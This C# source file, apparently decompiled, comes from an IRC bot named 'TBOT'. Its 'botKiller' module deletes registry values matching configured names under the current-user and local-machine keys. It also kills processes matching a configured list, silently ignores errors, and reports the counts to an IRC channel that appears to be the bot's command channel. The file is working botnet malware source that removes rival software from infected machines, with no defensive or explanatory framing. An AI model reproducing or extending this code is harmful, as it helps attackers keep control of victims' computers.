using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace TBOT;

internal class botKiller
{
	public static void clean()
	{
		string[] infectedDirsCU = Config.infectedDirsCU;
		string[] infectedDirLM = Config.infectedDirLM;
		int num = 0;
		string[] infectedNames = Config.infectedNames;
		int num2 = 0;
		string[] badProc = Config.badProc;
		RegistryKey currentUser = Registry.CurrentUser;
		for (int i = 0; i < infectedDirsCU.Length; i++)
		{
			currentUser = Registry.CurrentUser.OpenSubKey(infectedDirsCU[i], writable: true);
			if (currentUser == null || currentUser.GetValueNames().Length == 0)
			{
				continue;
			}
			string[] valueNames = currentUser.GetValueNames();
			for (int j = 0; j < valueNames.Length; j++)
			{
				for (int k = 0; k < infectedNames.Length; k++)
				{
					if (valueNames[j].ToLower().Contains(infectedNames[k].ToLower()))
					{
						try
						{
							RegistryKey registryKey = currentUser;
							registryKey.OpenSubKey(valueNames[j], writable: true);
							registryKey.DeleteValue(valueNames[j], throwOnMissingValue: true);
							num++;
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
		for (int l = 0; l < infectedDirLM.Length; l++)
		{
			currentUser = Registry.LocalMachine.OpenSubKey(infectedDirLM[l], writable: true);
			if (currentUser == null || currentUser.GetValueNames().Length == 0)
			{
				continue;
			}
			string[] valueNames2 = currentUser.GetValueNames();
			for (int m = 0; m < valueNames2.Length; m++)
			{
				for (int n = 0; n < infectedNames.Length; n++)
				{
					if (valueNames2[m].ToLower().Contains(infectedNames[n].ToLower()))
					{
						try
						{
							RegistryKey registryKey2 = currentUser;
							registryKey2.OpenSubKey(valueNames2[m], writable: true);
							registryKey2.DeleteValue(valueNames2[m], throwOnMissingValue: true);
							num++;
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] array = badProc;
			foreach (string text in array)
			{
				if (process.ProcessName.ToLower().Contains(text.ToLower()))
				{
					try
					{
						process.Kill();
						num2++;
					}
					catch (Exception)
					{
					}
					break;
				}
			}
		}
		Irc.WriteTo(Config.ircChannel, "Cleaned " + num + " regkeys! " + num2 + " Processes Killed!");
	}
}
